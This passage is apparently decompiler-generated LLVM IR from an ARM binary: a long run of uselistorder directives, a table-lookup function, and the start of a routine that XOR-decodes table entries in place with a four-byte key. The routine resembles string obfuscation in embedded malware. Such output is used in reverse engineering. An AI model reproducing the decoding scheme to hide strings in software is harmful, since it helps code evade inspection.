  uselistorder i32 %v0_edb4, { 1, 0 }
  uselistorder i32 %v1_ed98, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_ed8c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ed8c, { 0, 2, 1 }
  uselistorder i32 %v1_ed7c, { 1, 0 }
  uselistorder i32 %v3_ee48, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_ecdc, { 1, 0 }
  uselistorder i32 %v1_ecc4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ecd0, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ec80, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_ec74, { 2, 1, 0 }
  uselistorder i32 %v1_ec54, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_ec30, { 1, 0 }
  uselistorder i1 %v9_ebfc, { 1, 0 }
  uselistorder i32 %v0_ebac, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_eb50, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_eb00, { 1, 0 }
  uselistorder i32 %v5_ea98, { 1, 0 }
  uselistorder i32 %v3_ea88, { 1, 2, 0 }
  uselistorder i16 %v4_ea84, { 1, 0 }
  uselistorder i32 %v3_ea84, { 1, 0 }
  uselistorder i1 %v2_e9c0, { 1, 0 }
  uselistorder i1 %v2_e9ac, { 1, 0 }
  uselistorder i1 %v2_e998, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_e974, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_e95c, { 1, 0 }
  uselistorder i1 %v3_e940, { 1, 0, 2 }
  uselistorder i1 %v2_e92c, { 1, 0 }
  uselistorder i1 %v2_e908, { 1, 0 }
  uselistorder i32 %v1_e8b8, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e8a4, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_e8a0, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_e888, { 1, 0 }
  uselistorder i32 %stack_var_-1876.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_e870, { 1, 0, 2 }
  uselistorder i32 %v2_f9a0, { 1, 2, 0 }
  uselistorder i32 %v2_f7e4, { 0, 2, 1, 4, 11, 12, 10, 7, 9, 8, 6, 5, 3 }
  uselistorder i32 %v2_f88c, { 1, 0 }
  uselistorder i32 %v2_ee54, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_e848, { 0, 3, 6, 5, 7, 1, 2, 4, 8 }
  uselistorder i32 %v4_e718, { 2, 1, 0, 3 }
  uselistorder i16 %v5_e6ac.le, { 1, 0 }
  uselistorder i32 %v0_e690, { 3, 2, 0, 1 }
  uselistorder i32 %v2_e664, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v7_e630, { 1, 0 }
  uselistorder i32 %v3_e628, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_e614, { 1, 0 }
  uselistorder i32 %v2_e5f8, { 1, 0, 2 }
  uselistorder i32 %v0_e5e4, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_e558, { 3, 2, 1, 0, 4 }
  uselistorder i8* %stack_var_-56, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 0, 11, 12, 13, 9, 14, 15, 1, 2, 16, 3, 17, 6, 18, 4, 19, 5, 20, 7, 21, 8, 22, 10, 23 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 6, 3, 0, 1, 2, 5, 4, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 77, 79, 80, 81, 83, 82, 84, 85, 35, 143, 61, 62, 0, 1, 2, 36, 37, 38, 39, 40, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 63, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 113, 112, 109, 114, 163, 164, 115, 116, 165, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 162, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 146, 145, 148, 147, 156, 149, 150, 151, 152, 153, 154, 155, 157, 158, 159, 160, 161 }
  uselistorder i32* %r2.global-to-local, { 42, 43, 44, 45, 46, 47, 48, 35, 36, 37, 49, 50, 51, 52, 23, 38, 39, 0, 1, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 40, 41, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 112, 113, 68, 69, 71, 70, 67, 114, 72, 115, 73, 117, 118, 74, 75, 76, 77, 78, 79, 80, 81, 82, 65, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 116, 103, 104, 105, 106, 107, 108, 109, 110, 111 }
  uselistorder i32* %r1.global-to-local, { 51, 52, 53, 54, 55, 56, 57, 43, 45, 44, 46, 58, 59, 60, 61, 62, 30, 47, 48, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 108, 109, 49, 50, 63, 64, 65, 66, 67, 68, 69, 71, 72, 73, 70, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r0.global-to-local, { 109, 108, 110, 111, 112, 114, 113, 115, 116, 117, 118, 120, 121, 119, 83, 82, 84, 86, 85, 87, 88, 89, 91, 90, 23, 25, 125, 122, 1, 3, 2, 4, 123, 124, 126, 128, 127, 92, 130, 59, 61, 60, 94, 93, 95, 96, 97, 99, 98, 100, 26, 6, 5, 8, 7, 10, 9, 11, 62, 13, 12, 14, 16, 15, 18, 17, 19, 20, 21, 22, 28, 27, 30, 29, 0, 24, 32, 31, 33, 34, 35, 37, 36, 39, 38, 41, 40, 42, 44, 43, 45, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 57, 56, 58, 64, 63, 65, 67, 66, 69, 68, 71, 70, 72, 74, 76, 75, 78, 77, 80, 79, 81, 102, 104, 103, 105, 101, 106, 107, 143, 129, 133, 131, 132, 138, 134, 135, 179, 136, 137, 139, 141, 140, 142, 144, 149, 145, 148, 146, 147, 152, 150, 151, 155, 153, 154, 157, 156, 73, 195, 159, 158, 160, 162, 161, 164, 163, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 196, 180, 181, 182, 184, 183, 185, 190, 186, 187, 188, 189, 191, 192, 193, 194 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 22, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 116, 117, 141, 0, 239, 2, 236, 237, 128, 129, 118, 106, 120, 122, 123, 66, 67, 68, 69, 70, 1, 119, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 121, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 33, 34, 35, 30, 31, 32, 36, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 71, 72, 73, 74, 75, 76, 78, 79, 80, 81, 82, 84, 85, 86, 225, 94, 95, 96, 91, 92, 93, 97, 98, 99, 100, 101, 102, 107, 108, 109, 103, 104, 105, 110, 111, 112, 113, 114, 115, 124, 125, 126, 127, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 226, 227, 142, 143, 144, 145, 146, 148, 147, 149, 150, 151, 154, 156, 157, 155, 152, 153, 235, 234, 232, 158, 233, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 90, 197, 198, 89, 199, 200, 88, 201, 202, 203, 204, 205, 206, 87, 207, 208, 209, 210, 211, 83, 212, 213, 214, 77, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 228, 229, 230, 238, 231 }
  uselistorder i1* %cpsr_c.global-to-local, { 114, 115, 137, 0, 232, 2, 124, 229, 230, 125, 116, 101, 117, 119, 120, 66, 67, 68, 69, 1, 100, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 118, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29, 33, 34, 35, 30, 31, 32, 36, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 70, 71, 72, 74, 75, 76, 78, 79, 80, 82, 83, 84, 218, 91, 92, 93, 87, 88, 89, 94, 95, 96, 97, 98, 99, 105, 106, 107, 102, 103, 104, 108, 109, 110, 111, 112, 113, 121, 122, 123, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 219, 220, 138, 139, 140, 141, 142, 143, 144, 145, 148, 150, 151, 149, 146, 147, 228, 227, 225, 152, 226, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 90, 189, 190, 86, 191, 192, 85, 193, 194, 195, 196, 197, 198, 81, 199, 200, 201, 202, 203, 77, 204, 205, 206, 73, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 221, 222, 223, 231, 224 }
  uselistorder i32 (i32)* @function_11334, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_16170.75 to i32), { 0, 2, 1, 3 }
  uselistorder i16* bitcast (i16** @global_var_1ea14.127 to i16*), { 1, 0 }
  uselistorder i16** @global_var_1ea14.127, { 1, 0 }
  uselistorder i32 ptrtoint (i16** @global_var_1ea14.127 to i32), { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1143c, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), { 5, 7, 6, 8, 2, 9, 0, 10, 1, 11, 3, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @function_11528, { 14, 13, 12, 11, 10, 9, 8, 20, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 19, 18, 17, 16, 15, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 2, 3, 4, 5, 8, 9, 10, 11 }
  uselistorder i8 34, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 4, 5, 14, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 8, 9, 10, 11, 12, 13, 14, 15, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 62, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @function_fcc0, { 28, 41, 40, 27, 34, 39, 38, 37, 36, 35, 33, 32, 31, 30, 29, 26, 2, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_103d0, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @function_fc9c, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 34, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37 }
  uselistorder i32 (i32)* @function_fd60, { 23, 22, 31, 30, 29, 28, 27, 26, 25, 24, 21, 3, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_114b4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10afc, { 1, 0 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_e324, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_114ec, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_11560, { 9, 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_c898, { 9, 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_1ea00.182, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @function_c848, { 11, 10, 9, 2, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_1e9f2.179 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 62, { 2, 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_161f4.173 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_161ec.171 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_161b0.159 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_e3ec, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1618c.151 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_16190.149 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_1ea09.146, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_1e9fc.140, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_1e9fc.140 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_1ea08.141, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_1e9e8.137, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e9e8.137 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @function_e0b4, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 14, 13, 12, 11, 10, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_115a0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 2048, { 5, 4, 1, 2, 3, 6, 7, 0, 8, 9 }
  uselistorder i32* @global_var_20a6c.135, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_20a68.133, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_1ea18.121, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @function_e110, { 1, 0 }
  uselistorder i32* @global_var_20a4c.46, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_20a4c.46 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @function_105d4, { 2, 1, 0 }
  uselistorder i32 ()* @function_10ac8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fbf8, { 1, 0 }
  uselistorder label %dec_label_pc_fbf0, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fbe4, { 1, 0 }
  uselistorder label %dec_label_pc_ef34.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef34.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ef34.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f9d4, { 1, 0 }
  uselistorder label %dec_label_pc_f934, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f8fc, { 1, 0 }
  uselistorder label %dec_label_pc_f8e8, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f8d8, { 1, 0 }
  uselistorder label %dec_label_pc_f7c8, { 1, 0 }
  uselistorder label %dec_label_pc_f748, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f714, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f6c4, { 1, 0 }
  uselistorder label %dec_label_pc_f608, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f5f0, { 1, 0 }
  uselistorder label %dec_label_pc_f4bc, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f4a4, { 1, 0 }
  uselistorder label %dec_label_pc_f3e8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f3d0, { 1, 0 }
  uselistorder label %dec_label_pc_f35c, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f328, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f308, { 1, 0 }
  uselistorder label %dec_label_pc_f2f4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f2b0, { 1, 0 }
  uselistorder label %dec_label_pc_f2b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f244, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f22c, { 1, 0 }
  uselistorder label %dec_label_pc_f170, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f158, { 1, 0 }
  uselistorder label %dec_label_pc_f038, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f000, { 1, 0 }
  uselistorder label %dec_label_pc_ef98, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ef4c, { 1, 0 }
  uselistorder label %dec_label_pc_ef3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ef3c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_ef18, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ee3c, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_ed30.dec_label_pc_ed30_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed0c.dec_label_pc_ed0c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ed00, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ece8, { 1, 0 }
  uselistorder label %dec_label_pc_ecc4, { 1, 0 }
  uselistorder label %dec_label_pc_eb78, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_eb64, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_e9f8, { 1, 0 }
  uselistorder label %dec_label_pc_e9ec, { 1, 0 }
  uselistorder label %dec_label_pc_e9e0, { 1, 0 }
  uselistorder label %dec_label_pc_e9d4, { 1, 0 }
  uselistorder label %dec_label_pc_e9c8, { 1, 0 }
  uselistorder label %dec_label_pc_e9b4, { 1, 0 }
  uselistorder label %dec_label_pc_e9a0, { 1, 0 }
  uselistorder label %dec_label_pc_e98c, { 1, 0 }
  uselistorder label %dec_label_pc_e96c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e948, { 1, 0 }
  uselistorder label %dec_label_pc_e93c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e918, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e8f4, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e8a0, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
}

define i32 @function_fc9c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_fc9c:
  store i32 ptrtoint (i32* @global_var_20a78.197 to i32), i32* @r2, align 4
  %v3_fca0 = mul i32 %arg1, 8
  %v2_fca4 = add i32 %v3_fca0, ptrtoint (i32* @global_var_20a78.197 to i32)
  store i32 %v2_fca4, i32* @r3, align 4
  %v2_fca8 = icmp eq i32* %arg2, null
  br i1 %v2_fca8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_fc9c
  %v3_fcb04 = inttoptr i32 %v2_fca4 to i32*
  %v4_fcb05 = load i32, i32* %v3_fcb04, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_fc9c
  %v2_fcac = add i32 %v3_fca0, add (i32 ptrtoint (i32* @global_var_20a78.197 to i32), i32 4)
  %v3_fcac = inttoptr i32 %v2_fcac to i16*
  %v4_fcac = load i16, i16* %v3_fcac, align 4
  %v5_fcac = zext i16 %v4_fcac to i32
  store i32 %v5_fcac, i32* @r3, align 4
  %v3_fcb0 = inttoptr i32 %v2_fca4 to i32*
  %v4_fcb0 = load i32, i32* %v3_fcb0, align 4
  store i32 %v5_fcac, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_fcb06 = phi i32 [ %v4_fcb05, %.thread ], [ %v4_fcb0, %bb ]
  ret i32 %v4_fcb06

; uselistorder directives
  uselistorder i32 %v2_fca4, { 1, 0, 2 }
  uselistorder i32 %v3_fca0, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_fcc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_fcc0:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fcc8 = mul i32 %arg1, 8
  %v2_fccc = add i32 %v3_fcc8, ptrtoint (i32* @global_var_20a78.197 to i32)
  %v2_fcd0 = load i32, i32* inttoptr (i32 124936 to i32*), align 8
  %v1_fcd4 = add i32 %v3_fcc8, add (i32 ptrtoint (i32* @global_var_20a78.197 to i32), i32 4)
  %v2_fcd4 = inttoptr i32 %v1_fcd4 to i16*
  %v3_fcd4 = load i16, i16* %v2_fcd4, align 4
  %v3_fcd8 = udiv i32 %v2_fcd0, 256
  %v2_fcdc = icmp eq i16 %v3_fcd4, 0
  store i1 %v2_fcdc, i1* @cpsr_z, align 1
  %v3_fce0 = udiv i32 %v2_fcd0, 65536
  store i32 %v3_fce0, i32* @r3, align 4
  %v3_fce4 = load i32, i32* @r4, align 4
  store i32 %v3_fce4, i32* %stack_var_-16, align 4
  %v1_fce8 = urem i32 %v3_fcd8, 256
  store i32 %v1_fce8, i32* %r6.global-to-local, align 4
  %v1_fcec = urem i32 %v3_fce0, 256
  store i32 %v1_fcec, i32* %r5.global-to-local, align 4
  %v3_fcf0 = udiv i32 %v2_fcd0, 16777216
  store i32 %v3_fcf0, i32* %r4.global-to-local, align 4
  %v1_fcf4 = urem i32 %v2_fcd0, 256
  store i32 %v1_fcf4, i32* %lr.global-to-local, align 4
  br i1 %v2_fcdc, label %dec_label_pc_fd50, label %dec_label_pc_fcfc

dec_label_pc_fcfc:                                ; preds = %dec_label_pc_fcc0
  store i32 0, i32* @ip, align 4
  %v1_fd00 = inttoptr i32 %v2_fccc to i32*
  br label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fd00.dec_label_pc_fd00_crit_edge, %dec_label_pc_fcfc
  %v0_fd08 = phi i32 [ %v0_fd08.pre, %dec_label_pc_fd00.dec_label_pc_fd00_crit_edge ], [ %v1_fcf4, %dec_label_pc_fcfc ]
  %v2_fd0c = phi i32 [ %v1_fd44, %dec_label_pc_fd00.dec_label_pc_fd00_crit_edge ], [ 0, %dec_label_pc_fcfc ]
  %v2_fd00 = load i32, i32* %v1_fd00, align 4
  %v2_fd04 = add i32 %v2_fd00, %v2_fd0c
  %v3_fd04 = inttoptr i32 %v2_fd04 to i8*
  %v4_fd04 = load i8, i8* %v3_fd04, align 1
  %v6_fd04 = zext i8 %v4_fd04 to i32
  %v2_fd08 = xor i32 %v6_fd04, %v0_fd08
  %v1_fd0c = trunc i32 %v2_fd08 to i8
  store i8 %v1_fd0c, i8* %v3_fd04, align 1
  %v2_fd10 = load i32, i32* %v1_fd00, align 4
  %v0_fd14 = load i32, i32* @ip, align 4
  %v2_fd14 = add i32 %v0_fd14, %v2_fd10
  %v3_fd14 = inttoptr i32 %v2_fd14 to i8*
  %v4_fd14 = load i8, i8* %v3_fd14, align 1
  %v6_fd14 = zext i8 %v4_fd14 to i32
  %v0_fd18 = load i32, i32* %r6.global-to-local, align 4
  %v2_fd18 = xor i32 %v0_fd18, %v6_fd14
  %v1_fd1c = trunc i32 %v2_fd18 to i8
  store i8 %v1_fd1c, i8* %v3_fd14, align 1
  %v2_fd20 = load i32, i32* %v1_fd00, align 4
  %v0_fd24 = load i32, i32* @ip, align 4
  %v2_fd24 = add i32 %v0_fd24, %v2_fd20
  %v3_fd24 = inttoptr i32 %v2_fd24 to i8*
  %v4_fd24 = load i8, i8* %v3_fd24, align 1
  %v6_fd24 = zext i8 %v4_fd24 to i32
